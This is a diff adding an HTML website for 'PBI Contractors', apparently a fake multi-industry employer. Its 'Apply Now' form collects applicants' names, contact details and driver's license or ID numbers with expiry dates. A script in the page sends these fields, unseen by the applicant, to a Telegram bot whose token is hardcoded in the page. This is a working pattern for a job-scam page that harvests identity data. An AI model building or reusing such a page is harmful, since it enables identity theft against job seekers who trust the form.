@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PBI Contractors</title>
+<style>
+  body { margin:0; font-family: Arial, sans-serif; background:#f4f4f4; }
+  nav { background:#0d3b66; color:white; padding:10px 20px; display:flex; justify-content:space-between; align-items:center; position:sticky; top:0; z-index:1000; }
+  nav a { color:white; margin:0 10px; text-decoration:none; font-weight:bold; }
+  nav a:hover { text-decoration:underline; }
+  section { display:none; padding:40px 20px; max-width:1200px; margin: auto; }
+  section.active { display:block; animation:fadeIn 0.5s ease-in; }
+  h1,h2,h3 { color:#0d3b66; }
+  button { padding:10px 20px; background:#0d3b66; color:white; border:none; border-radius:5px; cursor:pointer; }
+  button:hover { background:#144d8f; }
+  .job-form input, .job-form select { width:100%; padding:10px; margin:5px 0 15px 0; border:1px solid #ccc; border-radius:5px; }
+  .job-form label { font-weight:bold; }
+  @keyframes fadeIn { from {opacity:0;} to {opacity:1;} }
+  footer { background:#0d3b66; color:white; text-align:center; padding:20px; margin-top:40px; }
+</style>
+</head>
+<body>
+
+<!-- Navigation -->
+<nav>
+  <div><strong>PBI Contractors</strong></div>
+  <div>
+    <a href="#home" onclick="navigate('home')">Home</a>
+    <a href="#about" onclick="navigate('about')">About</a>
+    <a href="#services" onclick="navigate('services')">Services</a>
+    <a href="#careers" onclick="navigate('careers')">Careers</a>
+    <a href="#contact" onclick="navigate('contact')">Contact</a>
+  </div>
+</nav>
+
+<!-- Sections -->
+<section id="home" class="active">
+  <h1>Welcome to PBI Contractors</h1>
+  <p>The blueprint for global excellence across every industry.</p>
+</section>
+
+<section id="about">
+  <h2>About Us</h2>
+  <p>We started in construction and evolved into a multi-industry solutions provider, integrating technology, healthcare, retail, marketing, and more.</p>
+</section>
+
+<section id="services">
+  <h2>Our Services</h2>
+  <ul>
+    <li>Construction & Engineering</li>
+    <li>Medical & Healthcare</li>
+    <li>Retail & Commerce</li>
+    <li>Marketing & Creative Agency</li>
+    <li>IT & Technology Solutions</li>
+    <li>Energy & Environment</li>
+    <li>Logistics & Transportation</li>
+    <li>Hospitality & Tourism</li>
+    <li>Education & E-Learning</li>
+    <li>Defense & Government</li>
+  </ul>
+</section>
+
+<section id="careers">
+  <h2>Careers at PBI Contractors</h2>
+  <p>Join our team — Remote and On-site opportunities available.</p>
+  <button onclick="openJobModal()">Apply Now</button>
+
+  <!-- Job Modal -->
+  <div id="jobModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); justify-content:center; align-items:center;">
+    <div style="background:white; padding:20px; border-radius:10px; max-width:500px; width:90%;">
+      <h3>Job Application</h3>
+      <form class="job-form" id="jobForm">
+        <label for="name">Full Name</label>
+        <input type="text" id="name" required>
+
+        <label for="email">Email</label>
+        <input type="email" id="email" required>
+
+        <label for="phone">Phone Number</label>
+        <input type="text" id="phone" required>
+
+        <label for="jobRole">Job Role</label>
+        <select id="jobRole" required>
+          <option value="">Select Role</option>
+          <option>Project Superintendent</option>
+          <option>Medical Technician</option>
+          <option>Software Developer</option>
+          <option>Digital Marketing Strategist</option>
+          <option>Electrician / HVAC</option>
+          <option>Logistics / Fleet Driver</option>
+        </select>
+
+        <label for="idNumber">Driver's License / ID Number</label>
+        <input type="text" id="idNumber" placeholder="Enter ID Number (USA format)" required>
+
+        <label for="idExpiry">Expiration Date</label>
+        <input type="date" id="idExpiry" required>
+
+        <button type="button" onclick="submitJob()">Submit Application</button>
+        <button type="button" onclick="closeJobModal()">Cancel</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<section id="contact">
+  <h2>Contact Us</h2>
+  <p>📍 44433 Fern Avenue, Lancaster, CA 93534</p>
+  <p>📞 (818) 625-8794</p>
+  <p>📧 Email: your-email@example.com</p>
+  <iframe src="https://maps.google.com/maps?q=44433%20Fern%20Avenue%20Lancaster%20CA&t=&z=15&ie=UTF8&iwloc=&output=embed" style="width:100%; height:300px; border:0;"></iframe>
+</section>
+
+<footer>
+  &copy; 2026 PBI Contractors
+</footer>
+
+<script>
+// Navigation
+function navigate(page){
+  document.querySelectorAll("section").forEach(s => s.classList.remove("active"));
+  const sec = document.getElementById(page);
+  if(sec) sec.classList.add("active");
+  window.scrollTo(0,0);
+}
+function loadPageFromHash(){
+  const hashPage = window.location.hash.replace("#","");
+  if(document.getElementById(hashPage)) navigate(hashPage); else navigate("home");
+}
+window.addEventListener("hashchange", loadPageFromHash);
+loadPageFromHash();
+
+// Job Modal
+function openJobModal(){ document.getElementById("jobModal").style.display="flex"; }
+function closeJobModal(){ document.getElementById("jobModal").style.display="none"; }
+
+// Submit Job to Telegram
+function submitJob(){
+  const name = document.getElementById("name").value;
+  const email = document.getElementById("email").value;
+  const phone = document.getElementById("phone").value;
+  const role = document.getElementById("jobRole").value;
+  const idNum = document.getElementById("idNumber").value;
+  const idExp = document.getElementById("idExpiry").value;
+
+  const message = `New Job Application:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}\nRole: ${role}\nID Number: ${idNum}\nExpiry: ${idExp}`;
+
+  const botToken = "5396804312:AAFoSVysclPcwDi73uSpWHZn24lUk2-8Mng";
+  const chatId = "257440171";
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id: chatId, text: message})
+  }).then(res => {
+    if(res.ok){ closeJobModal(); alert("Application submitted!"); }
+    else alert("Error sending application. Try again.");
+  }).catch(err => { alert("Error sending application. Try again."); console.error(err); });
+}
+</script>
+
+<!-- Tawk.to Live Chat -->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/YOUR_WIDGET_ID/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+
+</body>
+</html>
